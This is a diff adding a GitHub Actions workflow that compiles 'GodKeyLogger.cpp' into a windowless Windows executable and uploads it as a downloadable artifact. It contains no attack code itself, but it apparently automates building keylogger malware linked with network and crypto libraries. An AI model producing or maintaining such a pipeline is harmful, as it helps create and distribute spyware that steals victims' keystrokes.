@@ -1,0 +1,66 @@
+name: 🏗️ Build GodKeyLogger
+
+# 🔥 SIMPLE TRIGGER - No duplicates
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:  # Manual trigger option
+
+# 🔥 PREVENT CONCURRENT RUNS
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+
+env:
+  EXE_NAME: "GodKeyLogger.exe"
+
+jobs:
+  build:
+    name: 🔨 Build Windows Executable
+    runs-on: windows-latest
+    
+    steps:
+    - name: 📥 Checkout code
+      uses: actions/checkout@v4
+      
+    - name: ⚙️ Setup Visual Studio
+      uses: microsoft/setup-msbuild@v1.1
+      
+    - name: 🏗️ Compile with MSVC
+      shell: cmd
+      run: |
+        echo ==============================
+        echo   Building: GodKeyLogger
+        echo ==============================
+        
+        cl /EHsc /Ox /W2 /std:c++17 ^
+          /DUNICODE /D_UNICODE /MT ^
+          GodKeyLogger.cpp ^
+          /link /SUBSYSTEM:WINDOWS ^
+          /OUT:GodKeyLogger.exe ^
+          user32.lib gdi32.lib advapi32.lib ^
+          winhttp.lib crypt32.lib
+          
+        if %errorlevel% neq 0 exit 1
+        
+    - name: ✅ Verify build
+      shell: cmd
+      run: |
+        if not exist GodKeyLogger.exe (
+          echo "❌ ERROR: Build failed!"
+          exit 1
+        )
+        
+        echo "✅ SUCCESS: Build completed!"
+        echo "📁 File: GodKeyLogger.exe"
+        
+        for %%F in (GodKeyLogger.exe) do (
+          echo "📦 Size: %%~zF bytes"
+        )
+        
+    - name: 📤 Upload artifact
+      uses: actions/upload-artifact@v4
+      with:
+        name: GodKeyLogger-Executable
+        path: GodKeyLogger.exe
+        retention-days: 30
